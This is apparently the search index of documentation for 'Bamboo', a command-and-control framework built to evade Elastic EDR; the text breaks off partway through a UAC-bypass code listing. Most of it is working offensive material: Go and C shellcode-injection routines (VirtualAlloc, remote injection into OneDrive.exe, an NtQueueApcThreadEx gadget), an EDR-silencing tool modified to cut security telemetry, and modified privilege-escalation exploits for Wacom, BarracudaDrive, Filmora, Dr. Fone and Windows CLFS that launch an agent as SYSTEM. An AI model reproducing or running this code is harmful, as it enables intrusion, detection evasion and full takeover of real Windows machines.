{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Introduction","text":"<p>Bamboo is a Command &amp; Control (C2) Framework that consists of three main components: Bamboo Client, Bamboo Teamserver, and Bamboo Agent. These components work together to allow users to have a seamless scalable experience to do penetration testing or general testing of evading Elastic.  Bamboo offers multiple pre-built evasion techniques that are well tested and modified to evade Elastic. Moreover, there are multiple built-in third party exploits that users can use initially to try out Bamboo.</p> <p></p> <p>This website documents the various components of the Bamboo Framework, including its evasion tools, pre-built exploits, post-exploitation tools and how to use the framework.</p>"},{"location":"bamboo_architecture.html","title":"Bamboo Architecture","text":"<p>This section will provide an overview of the Bamboo Framework components and how they interact. The Bamboo Framework consists of 3 major entities: The Client, the Teamserver and the Agent. The architecture diagram below illustrates how the components in each of these entities interact with one another.</p> <p></p>"},{"location":"bamboo_architecture.html#bamboo-client","title":"Bamboo Client","text":"<p>The Bamboo Client acts as the handler for the Bamboo Teamserver. Developed with Python 3.11, the user can use either the command line (CLI) or graphical interface (GUI) to interact with the rest of the framework and perform actions such as:</p> <ul> <li>Run exploits on a target through the agent</li> <li>Add and modify exploits available on the Teamserver</li> <li>Use the team chat to message other Bamboo users on the same server</li> </ul> <p>The Bamboo Client can be run on most computers, but it is recommended to run it on the same host as the Teamserver, if only one Client is in use.</p>"},{"location":"bamboo_architecture.html#components","title":"Components","text":"Component Description Usage Commands Contain classes that directly calls the Bamboo Teamserver endpoints Bamboo Client command will call the functions within the classes GUI Component Contain all GUI only related folders and files Bamboo Client GUI was built with and rely on this component to interect with the Bamboo Teamserver Functions Contain miscellaneous functions that is called everywhere Bamboo Client relies on these function to be functional WebSocket Client Connects to server WebSocket Makes connection to the Bamboo Teamserver WebSocket and process broadcasted messages Post Exploitation Methods Contain preloaded post exploit tools Bamboo Clients can use these tools to furture extract valuable information Post Exploits Results of post exploit tools are stored here Bamboo Clients can view the results of the post exploitation tool"},{"location":"bamboo_architecture.html#bamboo-teamserver","title":"Bamboo Teamserver","text":"<p>The Bamboo Teamserver, designed to run on a Kali Linux machine, is the central server that records and stores data and exploits, and acts as the communication bridge between the users and the Agents. It hosts both HTTPS RESTful APIs and manages Websocket connections to handle communications with other components in the framework.</p> <p>The Teamserver is built in Python 3.11, and uses Flask for HTTPS communication. MongoDB is used to store information such as user accounts, agents connected and their status, as well as exploits and their configurations.</p> <p>The Teamserver keeps track of Agents connected to it by storing their information in the database, and constantly receives heartbeat messages from them to ensure they are alive. The Teamserver then updates the status of the Agents, and mark agents that has not communicated the heartbeat back as 'dead', which gets cleaned from the database after a while.</p> <p>By default, the port used by the Teamserver is TCP 4444</p>"},{"location":"bamboo_architecture.html#components_1","title":"Components","text":"Component Description Usage APIs All endpoints that enable Bamboo to communicate Bamboo Client and Bamboo Agent pass information using the endpoints WebSocket API Enable Bamboo Client and Bamboo Agent to connect via WebSocket Allows WebSocket connection Database (MongoDB) Contains everything related to database (models, initialisation, and collections) Allows the Bamboo Teamserver to initialise and interact with the database easily Functions Contain miscellaneous functions that is called everywhere The Bamboo Teamserver relies on these function to be functional PEM Files Contains the certificate and key Allows the Bamboo Teamserver to run in HTTPS and WSS with SSL"},{"location":"bamboo_architecture.html#bamboo-agent","title":"Bamboo Agent","text":"<p>The Agent an executable program developed using the Go programming language, and designed to run on a Windows 11 host. It resides in the target machine, and it is recommended for the Agent should be located in a user's desktop directory for the exploits made for the Bamboo Framework to work with the best effect.</p> <p>When the Agent is ran by either the command line or double clicking, it first collects information about the host and itself, such as preferred local and public IP addresses, hostname, and integrity level the agent is running at. The Bamboo agent then will repeatedly attempt to connect to the Bamboo Teamserver. Once it is connected, it will initialise a WebSocket connection with the Teamserver to allow it to receive instructions from the server.</p> <p>Once the agent is connected, it will perform two main actions:</p> <ol> <li>Listen to the Websocket connection for commmands send from the server</li> <li>Repeatedly send heartbeat messages to the Teamserver to indicate it is 'alive'</li> <li>To do this concurrently, the heartbeat function is ran in a goroutine for concurrency</li> </ol> <p></p>"},{"location":"bamboo_architecture.html#components_2","title":"Components","text":"Component Description Usage WebSocket Client Connects to Teamserver WebSocket Makes connection to the Bamboo Teamserver WebSocket and process commands sent through it HTTPS HTTP RESTful communication Makes connection to the Bamboo Teamserver APIs to send information or request for data Functions Miscellaneous functions Other commands the agent can perform Post Exploit Functions Contain post exploit functions Agent runs post-exploitation or enumeration function on command Exploit Methods Contain methods to execute exploits Agent receives and executes exploits on command"},{"location":"evasion.html","title":"Evasion","text":""},{"location":"evasion.html#shellcode-injection","title":"Shellcode Injection","text":"<p>Elastic Defend is unable to detect malicious in-memory files. Thus, these shellcode injection techniques are effective in executing payloads undetected. The shellcode injection techniques are implemented within Bamboo Agent and can be selected when the user uses the <code>exploit</code> command.</p>"},{"location":"evasion.html#virtual-allocation-injection","title":"Virtual Allocation Injection","text":"<p>Virtual Allocation injection is a technique used to inject shellcode into memory. As this method of injection uses VirtualAlloc, it allocates and injects shellcode into the memory of its own process.</p> <p>The exploits used by Bamboo tend to crash the injected process, so using Virtual Allocation will likely cause the Agent that ran it to crash.</p> <p>The technique involves the following steps:</p> <ol> <li>Use VirtualAlloc to reserve space to inject the shellcode inside the process.</li> <li>Copy the shellcode into the reserved space using RtlCopyMemory.</li> <li>Call VirtualProtect to change the protection on the injected space to allow execution.</li> <li>Create a new thread in the process using CreateThread to run the shellcode in the injected space.</li> <li>WaitForSingleObject is used to wait for the thread to finish.</li> </ol> <p>Implementation</p> <p>zaneGittins\u2019 go-inject simplifies using Windows functions related to injections, and is used by the agent to implement this technique.</p> Expand code <pre><code>func VirturalAlloc(payload string) (err error) {\n  sc, err := hex.DecodeString(payload)\n  if err != nil {\n    fmt.Printf(\"\\nError decoding shellcode: %s\\n\", err)\n    return\n  }\n\n  address := inject.VirtualAlloc(uintptr(0), len(sc), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)\n  inject.RtlMoveMemory2(address, sc)\n  inject.VirtualProtect(address, len(sc), windows.PAGE_EXECUTE_READ)\n  thread := inject.CreateThread(address)\n  inject.WaitForSingleObject(thread, 0xFFFFFFFF)\n  return\n}\n</code></pre> <p>The code for this injection technique is found in Bamboo Agent.</p>"},{"location":"evasion.html#remote-process-injection","title":"Remote Process Injection","text":"<p>Remote Process Injection, also called Vanilla Process Injection, is a shellcode injection technique that injects the shellcode into the memory of another process. Unlike the Virtual Allocation Injection technique above, this technique used VirtualAllocEx rather than VirtualAlloc, which allocates memory in another process instead of the local process.</p> <p>The advantages of using process injection over injecting into itself are:</p> <ul> <li>Causing the injected process to crash instead of the agent used to inject.</li> <li>Make use of any whitelisting detection tools have for the injected process</li> </ul> <p>The steps this technique uses is:</p> <ol> <li>Get the PID of the process to inject.</li> <li>Call OpenProcess to get a handle for the process to inject into.</li> <li>Use VirtualAllocEx to allocate space for the shellcode in the remote process.</li> <li>Write the shellcode into the allocated space using WriteProcessMemory.</li> <li>Create a thread in the remote process with CreateRemoteThread to run the allocated space.</li> <li>Close the handle to the process with CloseHandle.</li> </ol> <p>Implementation</p> <p>Instead of finding the PID of a suitable process, the Agent will launch OneDrive.exe from the user\u2019s home directory. OneDrive is a very suitable process to inject into with the exploits Bamboo has, and launching the process before injecting into it will ensure that the process will be available to inject into. It is also whitelisted from Elastic Security\u2019s Component Model Hijacking as it is considered a noisy process.</p> Expand code <pre><code>...\nsc, err := hex.DecodeString(payload)\nif err != nil {\n  return\n}\n find and launch OneDrive.exe and use its PID\ncurrentUser, _ := user.Current()\noneDriveExe := currentUser.HomeDir + \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDrive.exe\"\ncmd := exec.Command(oneDriveExe)\ncmd.Stdout = os.Stdout\n// Start() runs the command without waiting for return - rest of the code can continue\n  err = cmd.Start()\n  if err != nil {\n  fmt.Println(err)\n    return errors.New(\"cannot launch process\")\n}\nexploitPID := cmd.Process.Pid\nfmt.Println(\"exploit pid:\", exploitPID)\n...\n</code></pre> <p>The rest of the injection technique is implemented with zaneGittins\u2019 go-inject library.</p> Expand code <pre><code>...\nprocessHandle, _ := inject.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uint32(int(exploitPID)))\nmemptr := inject.VirtualAllocEx(processHandle, uintptr(0), len(sc), 0x3000, 0x40)\n\n_ = inject.WriteProcessMemory(processHandle, memptr, sc)\ninject.CreateRemoteThread(processHandle, 0, 0, memptr, 0, 0, 0)\ninject.CloseHandle(processHandle)\nfmt.Println(windows.GetLastError())\nreturn\n</code></pre> <p>The code for this injection technique is found in Bamboo Agent.</p>"},{"location":"evasion.html#ntqueueapcthreadex-ntdll-gadget-injection","title":"NtQueueApcThreadEx NTDLL Gadget Injection","text":"<p>Description</p> <p>This is a novel shellcode injection method first used by Roshtyak, the DLL backdoor used by the malware Raspberry Robin. This was adapted into a C program and published on github by LLoydLabs, which is the original code Bamboo uses for its NtQueueApcThreadEx NTDLL Gadget Injection. The image below shows the parameters of <code>NtQueueApcThreadEx()</code>, a function in the Windows Native API. The original code only works with x86 shellcode. However, in the explanation below, the gadget <code>pop rax; ret</code> is used instead of <code>pop r32; ret</code> to make the technique work with x64 shellcode instead.</p> <p></p> <p>The technique uses the following steps:</p> <ol> <li>Allocate shellcode into the memory of the current process</li> <li>Scan the ntdll.dll code sections of the current process for a <code>pop rax; ret</code> gadget and pick 1 of these gadgets randomly.</li> <li>\u201crax\u201d refers to a general-purpose register such as eax, ebc, ecx etc. Thus, an example gadget that would meet this requirement is <code>pop ebp; ret</code>.</li> <li>An exception is the gadget <code>pop esp; ret</code> because this would pivot the stack.</li> <li>\u201cCode sections\u201d refers to IMAGE_SCN_CNT_CODE and IMAGE_SCN_MEM_EXECUTE</li> <li>Call <code>NtQueueApcThreadEx()</code> with the <code>ApcRoutine</code> set to the address of the random gadget found in step 2 (<code>pop rax; ret</code>) and <code>SystemArgument1</code> as the pointer to the shellcode allocated in step 1.</li> <li>With <code>ApcRoutine</code> set to the random gadget, the <code>pop r32</code> instruction will make the stack pointer point to <code>SystemArgument1</code>.</li> <li>The <code>ret</code> instruction will make the Instruction Pointer (IP) jump to the location that <code>SystemArgument1</code> points to, which is the location of the allocated shellcode in step 1</li> </ol> <p>This technique requires Microsoft Visual C++ redistributables x86 to be installed on the target which can be found at https://aka.ms/vs/16/release/vc_redist.x86.exe.</p> <p>Implementation</p> <p>The code is modified to work with x64 shellcode by changing a single line in gadget.h as shown in the code snippet below.</p> Expand code <pre><code>static\nBOOL\ngadget_match_valid(\n    PBYTE pbAddress\n)\n{\n    //return (*pbAddress != 0x5C &amp;&amp; (*pbAddress &amp; 0xF0) == 0x50) &amp;&amp; *(pbAddress + 1) == 0xC3; // for x86\n    return *pbAddress == 0x58 &amp;&amp; *(pbAddress + 1) == 0xC3; // for x64\n\n}\n</code></pre> <p>Additionally, in the original code, the shellcode was hardcoded in main.h. In Bamboo, the code is modified to receive shellcode via standard input. After the injection program is dropped onto the target and executed, the shellcode will be passed via standard input from the agent as a hexstring in the format \u201cab1823129ef\u2026\u201d, which is the standard format of shellcode that our agent uses for its injection techniques. This hexstring is stored into a buffer of the injection program and converted by a <code>convert_hex()</code> function into a hexstring of format \u201c\\xab\\x18\\x23\\x12\\xef\u2026\u201d. The rest of the code follows the logic of the original PoC from LloydLabs.</p> <p>When this injection technique is selected, Bamboo Agent drops its embedded Gadget Injection file onto the target, executes it, then passes the payload as a hexstring via standard input which is then injected.</p>"},{"location":"evasion.html#edr-blinding","title":"EDR Blinding","text":"<p>The tool below is not an injection technique, but instead used to disrupt the effectiveness of the EDR itself.</p>"},{"location":"evasion.html#edr-silencer","title":"EDR Silencer","text":"<p>Description</p> <p>EDRSilencer, created by netero1010 is an open-source evasion tool designed for disrupting Endpoint Detection and Response (EDR) systems. It leverages Windows Filtering Platform (WFP) APIs, which allows a program developer to create network filtering software that can examine, modify and stop network traffic. EDRSilencer uses the WFP to prevent EDR agents and processes from connecting and reporting security events with their servers, effectively disabling the EDR\u2019s threat detection capabilities of the EDR. The tool currently supports Elastic EDR, among other popular EDR solutions.</p> <p>Implementation</p> <p>In the original code's main function, it checks if the user inputs the correct number of command-line arguments and performs different actions based on the argument\u2019s value:</p> Arguments Description -h or --help Prints the help information blockedr Blocks all detected EDR processes from sending outbound traffic block  Blocks a specific process from sending outbound traffic unblockall Removes all WFP filters applied unblock  Removes a specific WFP filter based on its filter ID <p>The team modified the main function of the original code. The modified code no longer requires command-line arguments. It has been altered to only execute the <code>blockedr</code> argument. The modified code is as follows:</p> Expand code <pre><code>int main() {\n    if (!CheckProcessIntegrityLevel()) {\n        return 1;\n    }\n    PrintHelp();\n    BlockEdrProcessTraffic();\n    return 0;\n}\n</code></pre> <p>This modification allows the executable to be easily incorporated within our C2 and agent, making it more convenient and efficient for our purposes.</p>"},{"location":"exploits.html","title":"Exploits","text":""},{"location":"exploits.html#overview","title":"Overview","text":"<p>Bamboo comes with pre-loaded exploits for users to test the evasion techniques with. Bamboo also allows users the ability to add their own exploits. These exploits are stored as files in the Bamboo Teamserver.</p> Application / Service Vulnerable Version(s) CVE Identifier Wacom Driver 6.3.45-1 CVE-2023-32162 BarracudaDrive 6.5 CVE-2020-23834 Wondershare Filmora 12.2.9.2233 and below CVE-2023-31747 Wondershare Dr. Fone 12.3.14 CVE-2021-44596 Windows Common Log File System Windows 11 21H2, Windows 11 22H2 CVE-2023-28252 UAC Bypass - -"},{"location":"exploits.html#wacom-driver","title":"Wacom Driver","text":"<p>Description</p> <p>Wacom specialises in pen displays and tablets for designers. These products require the Wacom Driver to be installed. Luca Barile discovered several vulnerabilities, including one which allowed for Local Privilege Escalation (LPE). The exploit abuses various flaws in the design of the Wacom\u2019s utilities, including especially the implementation of Remove.exe for the backup process. Full details can be found on Luca\u2019s blog.</p> <p>Implementation</p> <p>Majority of the original code from Luca\u2019s LPE exploit was kept. However, the original exploit would launch a command prompt. In Bamboo, the exploit is modified to execute the agent.exe file which will be located on the user\u2019s desktop. This is achieved by instead injecting a Wacom command to launch the agent.exe file as shown in the code below.</p> Expand code <pre><code>string input1_line1 = \"/debug \\\\\"\" + pathInstallerDAT + \"\\\\\" /silent\";\nstring input1_line2 = \"[PrivilegeEscalation]\";\n\nstring username = Environment.UserName;\nstring input1_line3 = @\"Execute;1000;!WINDOWS!\\\\\\\\..\\\\\\\\Users\\\\\\\\\" + username + @\"\\\\\\\\Desktop\\\\\\\\agent.exe\";\nstring input1_line4 = \"DONE\";\nstring input2_line1 = \"/command PrivilegeEscalation /silent /debug \\\\\"\";\n</code></pre>"},{"location":"exploits.html#barracudadrive","title":"BarracudaDrive","text":"<p>Description</p> <p>BarracudaDrive is a web-based file explorer that provides users with a convenient way to access and manage files on local machines or network-attached storage devices. This application features file sharing, file management, advanced server side scripting language and collaboration capabilities. The application\u2019s vulnerability exploits weak and insecure folder permissions.</p> <p>Implementation</p> <p>The team constructed the exploit code to stop the application\u2019s service, copy the content of Bamboo\u2019s agent executable into C:\\bd\\bd.exe and start the service again after 30 seconds.</p> Expand code <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"io\"\n    \"time\"\n)\nfunc writeWondershare() {\n    // Get current user name from environment var\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n\n    //  opy the agent.exe file to C:\\Users\\[username]]\\Desktop\\bd.exe\n    agentFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\agent.exe\"\n    wondershareFilepath := \"C:\\\\bd\\\\bd.exe\"\n\n    agentFile, err := os.Open(agentFilepath)\n    if err != nil {\n        fmt.Printf(\"Error opening agent.exe: %v\", err)\n        return\n    }\n    defer agentFile.Close()\n\n    wondershareFile, err := os.Create(wondershareFilepath)\n    if err != nil {\n        fmt.Printf(\"Error creating bd.exe: %v\", err)\n        return\n    }\n    defer wondershareFile.Close()\n\n    _, err = io.Copy(wondershareFile, agentFile)\n    if err != nil {\n        fmt.Printf(\"Error copying agent.exe into bd.exe: %v\", err)\n        return\n    }\n}\n\n// restart bd service\nfunc restartbd() error {\n    serviceName := \"bd\"\n    fmt.Println(\"Stopping bd service...\")\n    cmd1 := exec.Command(\"sc\", \"stop\", serviceName)\n    err := cmd1.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    // wait for service to stop till we call writeWondershare()\n    fmt.Println(\"Waiting for 30 seconds...\")\n    time.Sleep(30 * time.Second)\n    writeWondershare()\n\n    fmt.Println(\"Starting bd service...\")\n    cmd2 := exec.Command(\"sc\", \"start\", serviceName)\n    err = cmd2.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    return nil\n}\n\nfunc main() {\n    restartbd()\n    fmt.Printf(\"Exploit complete\")\n}\n</code></pre> <p>In order to execute the Service Control (sc) utility to restart the service, administrative privileges are required. To overcome this, a manifest file was needs to be embedded into the executable.</p> Expand code <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n        &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n                &lt;security&gt;\n                        &lt;requestedPrivileges&gt;\n                                &lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/&gt;\n                        &lt;/requestedPrivileges&gt;\n                &lt;/security&gt;\n        &lt;/trustInfo&gt;\n&lt;/assembly&gt;\n</code></pre> <p>In the manifest file, the <code>requestedExecutionLevel</code> was specified as <code>requireAdministrator</code>. This configuration informs Windows OS that the application necessitates elevated privileges to function correctly. This manifest file is then converted into a .syso file using the rsrc tool by akavel.</p> <pre><code>.\\rsrc -manifest bd.exe.manifest -o bd.syso\n</code></pre> <p>Lastly, build the exploit with <code>go build</code> . The Go compiler will detect the .syso file and embed it in the final executable.</p>"},{"location":"exploits.html#wondershare-filmora","title":"Wondershare Filmora","text":"<p>Description</p> <p>Filmora is a video editor by Wondershare. The specific vulnerable component is NativePush (Build 1.0.0.7), which contains an unquoted service path. The unquoted service path allows attackers to execute their own file in place of the actual service file, allowing it to be executed with SYSTEM privileges when the service is run. Running the service requires administrator privileges. The vulnerability was authored by Thurein Soe.</p> <p>Implementation</p> <p>The exploit for Filmora was written by the team in Golang. It creates the agent.exe file in the unquoted service path, then restarts the NativePushService, causing the agent.exe file to be executed with SYSTEM integrity context.</p> Expand code <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"io\"\n)\n\n// Restart NativePushService\nfunc restartNativePushService() error {\n    serviceName := \"NativePushService\"\n    cmd1 := exec.Command(\"sc\", \"stop\", serviceName)\n    err := cmd1.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    cmd2 := exec.Command(\"sc\", \"start\", serviceName)\n    err = cmd2.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    return nil\n}\n\nfunc writeWondershare() {\n    // Get current user name from environment var\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n\n    // Copy the agent.exe file to C:\\Users\\[username]]\\Desktop\\Wondershare.exe\n    agentFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\agent.exe\"\n    wondershareFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\AppData\\\\Local\\\\Wondershare\\\\Wondershare.exe\"\n\n    agentFile, err := os.Open(agentFilepath)\n    if err != nil {\n        fmt.Printf(\"Error opening agent.exe: %v\", err)\n        return\n    }\n    defer agentFile.Close()\n\n    wondershareFile, err := os.Create(wondershareFilepath)\n    if err != nil {\n        fmt.Printf(\"Error creating wondershare.exe: %v\", err)\n        return\n    }\n    defer wondershareFile.Close()\n\n    _, err = io.Copy(wondershareFile, agentFile)\n    if err != nil {\n        fmt.Printf(\"Error copying agent.exe into wondershare.exe: %v\", err)\n        return\n    }\n}\n\nfunc main() {\n    // Write the Wondershare.exe file\n    writeWondershare()\n\n    // Restart NativePushService\n    err := restartNativePushService()\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    fmt.Printf(\"Exploit complete\")\n}\n</code></pre> <p>Similarly to the BarracudaDrive exploit above, administrator privileges are needed to use the Service Control Utility (sc.exe) to restart the service. This means the exploit file must be run with administrative privileges. To achieve this, a manifest file (filmora.exe.manifest) must be embedded which specifies the <code>requestExecutionLevel</code> as <code>requireAdministrator</code> .</p> Expand code <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n        &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n                &lt;security&gt;\n                        &lt;requestedPrivileges&gt;\n                                &lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/&gt;\n                        &lt;/requestedPrivileges&gt;\n                &lt;/security&gt;\n        &lt;/trustInfo&gt;\n&lt;/assembly&gt;\n</code></pre> <p>Afterwards, the manifest file is generated into a .syso file using rsrc by akavel</p> <pre><code>.\\rsrc -manifest filmora.exe.manifest -o filmora.syso\n</code></pre> <p>Finally, the exploit is built with <code>go build</code> . Go detects the .syso file upon compilation and embed the file into the final executable.</p>"},{"location":"exploits.html#wondershare-dr-fone","title":"Wondershare Dr. Fone","text":"<p>Description</p> <p>The vulnerability and a PoC was discovered by Peled and Cohen. Dr. Fone install additional features as modules, which uses the service InstallAssistService to actually install it. The service listens on a random UDP port defined in the file C:\\ProgramData\\Wondershare\\ModuleUpgrade\\port. The service accepts any requests to it in the right format as commands without any form of authorization or validation and executes them at up to SYSTEM privilege.</p> <p>Implementation</p> <p>For an exploit that runs locally, this is the process that is used:</p> <ol> <li>Locate where the agent is located (in the user desktop directory) and craft the payload to run the agent at system level.</li> <li>Read C:\\ProgramData\\Wondershare\\ModuleUpgrade\\port to identify the port number the service is running on.</li> <li>Send the payload to the service through the UDP port.</li> </ol> Expand code <pre><code>func main() {\n    // agent location\n    currentUser, _ := user.Current()\n    homedir := currentUser.HomeDir\n\n    // making payload\n    // payload format - filepath, parameters, authority, callpid\n    payload := fmt.Sprintf(\"%s\\\\Desktop\\\\agent.exe\\n\\nAdmin\\n12345\", homedir)\n    fmt.Println(payload)\n    // get port\n    // C:\\ProgramData\\Wondershare\\ModuleUpgrade\\port\n    data, _ := os.ReadFile(\"C:\\\\ProgramData\\\\Wondershare\\\\ModuleUpgrade\\\\port\")\n    port := string(data)\n    fmt.Println(\"\\n port found:\", port)\n\n    conn, err := net.Dial(\"udp\", \"127.0.0.1:\"+port)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    // send payload to port\n    _, err = conn.Write([]byte(payload))\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    conn.Close()\n}\n</code></pre>"},{"location":"exploits.html#windows-common-log-file-system","title":"Windows Common Log File System","text":"<p>Description</p> <p>The Windows Common Log File System (CLFS) is a high performing, general-purpose logging system that helps applications keep track of important events and recover from failures. It was discovered that a vulnerability exists due to an out of bound read and write flaw, leading to the execution of arbitrary code. The specific Windows 11 builds affected by this vulnerability are:</p> <p>The specific Windows 11 builds affected by this vulnerability are:</p> <ul> <li>Windows 11 22H1 (fixed in version 10.0.22000.1817)</li> <li>Windows 11 22H2 (fixed in version 10.0.22621.1555)</li> </ul> <p>Implementation</p> <p>The original PoC was developed by Fortra, a company that provides cybersecurity and automation solutions (www.fortra.com, n.d.). The execution of the original PoC requires three parameters: token offset, flag and the program to be executed. For instance, if the team wishes to elevate calc.exe to SYSTEM privileges, the command will be clfs_eop.exe 1208 1 calc.exe. Our team has modified the original PoC to automatically launch the agent executable with SYSTEM privileges. All credit goes to the original author, Fortra for discovering this vulnerability and creating the original PoC exploit.</p> <p>The code snippet shown below pertains to the manage_args function within clfs_eop.cpp. The team hardcoded the values of the token offset and flag to 1208 and 1 respectively. This eliminates the need for user input to these parameters. Setting these parameters directly in the code simplifies the execution process and ensures that the program being launched always has SYSTEM privileges.</p> Expand code <pre><code>void manage_args(int argc, TCHAR* argv[]) {\n\n            // hardcoded values\n    argv[1] = (TCHAR*)\"1208\";\n    argv[2] = (TCHAR*)\"1\";\n\n    token_offset = atoi((CHAR*)argv[1]);\n    if (token_offset == 0) {\n        printf(\"[+] Invalid token offset argument, must be decimal number\\n\");\n        exit(1);\n    }\n\n    flag = atoi((CHAR*)argv[2]);\n    if (flag == 0) {\n        printf(\"[+] Invalid token offset argument, must be decimal number\\n\");\n        exit(1);\n    }\n\n    printf(\"\\n\\nARGUMENTS\\n\");\n    printf(\"[+] TOKEN OFFSET %x\\n\", token_offset);\n    printf(\"[+] FLAG %x\\n\\n\", flag);\n    return;\n\n}\n</code></pre> <p>The code snippet shown below declares a global variable within clfs_eop.cpp. The function, getCurrentUsername retrieves the current username of the user and stores it in the global variable, currentUsername. It returns true on success and false on failure. This will be used in the to_trigger function which will be exhibited in the next code snippet.</p> Expand code <pre><code>// global variable currentUsername\nTCHAR currentUsername[500];\n// function to retrieve current user's username bool getCurrentUsername() {\n    DWORD size = sizeof(currentUsername) / sizeof(currentUsername[0]);\n\n    if (GetUserName(currentUsername, &amp;size)) {\n            // ensures null-termination\n            currentUsername[size] = '\\0';\n            std::wcout &lt;&lt; L\"CURRENT USER=\" &lt;&lt; currentUsername &lt;&lt; std::endl;\n            return true;\n\n    } else {\n            std::cerr &lt;&lt; \"Error: \" &lt;&lt; GetLastError() &lt;&lt; std::endl;\n            return false;\n        }\n}\n</code></pre> <p>The code snippet shown below pertains to the to_trigger function within clfs_eop.cpp. In the original code, the program it executes is notepad.exe by default. Instead of launching notepad.exe, the team modified it to launch the agent executable located in the user\u2019s directory and the team used the global variable declared in the previous code snippet and parsed it in the %s to complete the full file path.</p> Expand code <pre><code>    TCHAR agentPath[1000];\n\n// launch agent.exe within the current user's directory \\_stprintf_s(agentPath,\\_T(\"C:\\\\Users\\\\%s\\\\Desktop\\\\agent.exe\"), currentUsername);\n\n// check if we became SYSTEM\nif (\\_tcscmp(username, \\_T(\"SYSTEM\")) == 0) {\nprintf(\"WE ARE SYSTEM\\n\");\nTCHAR fpath[1000];\n\\_stprintf_s(fpath, \\_T(\"%s\"), agentPath);\n\\_tprintf(\\_T(\"Executing: %s\\n\"), fpath);\n\\_tsystem(fpath);\n} else {\nprintf(\"NOT SYSTEM\\n\");\n}\n</code></pre> <p>The getCurrentUsername function has also been called in the first line of the main function.</p> Expand code <pre><code>int main(int argc, TCHAR* argv[]) {\n    getCurrentUsername();\n    manage_args(argc, argv);\n    getVirtualAddress();\n    InitEnvironment();\n    doFirstAlloc();\n    createInitialLogFile();\n    fun_prepare();\n    to_trigger();\n    exit(1);\n    return 0;\n}\n</code></pre> <p>With this modification, it elevates our team\u2019s agent executable to SYSTEM privileges when it is being launched. The CLFS exploit, both original and modified, triggers two Malware Detection Alert in Elastic. The description of the two alerts are:</p> <ul> <li>File event with process explorer.exe, parent process userinit.exe, file clfs_eop.exe</li> <li>Process event with exploit.exe, parent process cmd.exe, file clfs_eop.exe</li> </ul> <p>This indicates that Elastic statically detects the exploit when it is first dropped onto the local machine\u2019s disk and again when executed.</p>"},{"location":"exploits.html#uac-bypass","title":"UAC Bypass","text":"<p>This is not an exploit, but is used in conjunction with certain exploits such as Filmora and BarracudaDrive.</p> <p>Description</p> <p>UAC is a security feature in Windows which requires applications to prompt for consent before an administrative task can be performed. This prevents malicious applications from running on your Windows device. The first image shows an example of a normal user receiving a UAC prompt, while the second image shows an example of an administrative user receiving a UAC prompt. A normal user requires an administrators login credentials while an administrative user just has a \u201cYes\u201d and \u201cNo\u201d consent box.</p> <p></p> <p>For more information on UAC, see this article from Microsoft.</p> <p>A UAC Bypass ONLY works if the current user is in the administrators group. It allows an application to bypass the consent prompt and run with administrator privileges. There are various methods to achieve a UAC Bypass as shown by HackTricks. In Bamboo, the UAC Bypass is achieved by modifying registry keys for the Windows computerdefaults.exe utility.</p> <p>Implementation</p> <p>The UAC Bypass script was written by the team in Golang. The code creates 2 registry keys and launches the computerdefaults.exe process. This works because when computerdefaults.exe is launched, it looks for the registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command which by default does not exist. If the key exists, it looks for the value HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute. If this value is found, computerdefaults.exe will look for the default value in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command. computerdefaults.exe follows the command found at the value in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\ when it starts. Thus, the team has directed it to launch our exploit which will always be dropped as \u201cpayload.exe\u201d in the user\u2019s Desktop.</p> Expand code <pre><code>package main\n\nimport (\n\"fmt\"\n\"golang.org/x/sys/windows/registry\"\n\"os/exec\"\n\"os\"\n\"path/filepath\"\n)\n\nfunc main() {\n\n    // Get current user name from environment var and determine location of payload to execute as admin\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n    payloadLocation := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\payload.exe\"\n    fmt.Printf(\"Payload location set as %v\\n\", payloadLocation)\n\n    // Modify registry keys\n    keyPath := `Software\\Classes\\ms-settings\\Shell\\Open\\command`\n    if err := 